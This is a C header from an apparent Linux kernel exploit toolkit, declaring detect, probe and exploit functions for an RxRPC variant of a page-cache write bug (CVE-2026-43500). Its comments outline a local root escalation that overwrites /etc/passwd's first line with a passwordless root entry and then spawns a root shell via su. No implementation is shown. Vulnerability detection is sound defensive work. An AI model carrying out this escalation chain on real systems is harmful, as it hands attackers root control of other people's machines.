/*
 * DIRTYFAIL — dirtyfrag_rxrpc.h
 *
 * RxRPC variant of Dirty Frag (CVE-2026-43500).
 */

#ifndef DIRTYFAIL_DIRTYFRAG_RXRPC_H
#define DIRTYFAIL_DIRTYFRAG_RXRPC_H

#include "common.h"

/* Precondition probe: kernel + rxrpc.ko + AF_RXRPC openable. */
df_result_t dirtyfrag_rxrpc_detect(void);

/* Real PoC: brute-force three rxkad session keys K_A, K_B, K_C such
 * that pcbc(fcrypt)-decrypting /etc/passwd line 1 at offsets 4/6/8
 * with last-write-wins produces "root::0:0:GGGGGG:/root:/bin/bash".
 * Then enter a fresh user/net namespace, run the three forged-handshake
 * splice triggers, and (if do_shell) execve `su -` to drop a root shell
 * via PAM `pam_unix nullok`. */
df_result_t dirtyfrag_rxrpc_exploit(bool do_shell);
df_result_t dirtyfrag_rxrpc_exploit_inner(void);

/* Active probe: fires ONE rxkad handshake-forgery trigger against a
 * /tmp sentinel (never /etc/passwd). The trigger writes ~8 bytes of
 * pcbc(fcrypt)-decrypted ciphertext into the sentinel page; we don't
 * need to predict what landed — any byte change confirms the kernel
 * STORE happened. Skips fcrypt brute force entirely (a random 8-byte
 * key is fine for a structural probe). Returns DF_VULNERABLE if the
 * sentinel changed, DF_OK if intact, DF_PRECOND_FAIL on AA-block. */
df_result_t dirtyfrag_rxrpc_active_probe(void);
df_result_t dirtyfrag_rxrpc_active_probe_inner(void);

#endif
